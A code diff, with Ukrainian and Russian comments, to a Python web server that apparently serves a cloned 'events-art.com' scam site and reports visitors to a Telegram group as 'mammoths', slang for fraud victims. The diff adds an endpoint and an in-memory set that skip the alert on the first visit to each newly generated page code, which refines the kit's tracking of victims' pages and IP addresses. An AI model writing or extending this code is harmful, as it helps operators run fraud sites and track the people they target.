@@ -11,6 +11,15 @@ from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
 PORT = 8080  # Альтернативный порт
 DIRECTORY = "events-art.com"  # Папка с сайтом
 
+# --- In-memory storage for ignoring first visit to new pages ---
+IGNORE_FIRST_VISIT_PAGE_CODES = set()  # page_code: для ігнорування першого переходу
+
+def add_ignore_first_visit(page_code):
+    """Додає page_code до списку для ігнорування першого переходу"""
+    if page_code:
+        IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
+        print(f"[IGNORE_FIRST_VISIT] Added {page_code} to ignore list")
+
 def send_telegram_log(page, link, ip, country=""):
     msg = (
         f"⚠️ Мамонт открыл страницу\n"
@@ -50,6 +59,15 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         # Якщо це ресурс — не логувати
         if any(ext in path for ext in skip_ext) or any(d in path for d in skip_dirs):
             return super().do_GET()
+        
+        # Перевіряємо, чи потрібно ігнорувати перший перехід для цього page_code
+        from urllib.parse import parse_qs
+        qs = {}
+        if '?' in self.path:
+            qs = parse_qs(self.path.split('?', 1)[1])
+        page_code = qs.get('page', [None])[0]
+        should_ignore_first_visit = page_code and page_code in IGNORE_FIRST_VISIT_PAGE_CODES
+        
         # Нормалізуємо шлях для унікальності
         norm_path = path
         if norm_path.endswith('/index.html'):
@@ -60,7 +78,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         should_log = (
             norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
         )
-        if should_log:
+        if should_log and not should_ignore_first_visit:
             if not hasattr(self.server, 'logged_paths'):
                 self.server.logged_paths = set()
             if norm_path not in self.server.logged_paths:
@@ -71,6 +89,11 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     link=self.path,
                     ip=self.client_address[0]
                 )
+        
+        # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
+        if should_ignore_first_visit:
+            IGNORE_FIRST_VISIT_PAGE_CODES.discard(page_code)
+            print(f"[IGNORE_FIRST_VISIT] Removed {page_code} from ignore list after first visit")
         try:
             super().do_GET()
         except Exception as e:
@@ -95,6 +118,28 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
                 self.wfile.write(f'Error: {e}'.encode('utf-8'))
+        elif path == '/ignore_first_visit':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            import json
+            try:
+                data = json.loads(post_data)
+                page_code = data.get('page_code')
+                if page_code:
+                    add_ignore_first_visit(page_code)
+                    print(f"[ignore_first_visit] Added {page_code} to ignore list")
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'ok')
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'no page_code')
+            except Exception as e:
+                print(f"[ignore_first_visit] Error: {e}")
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
         else:
             self.send_response(404)
             self.end_headers()
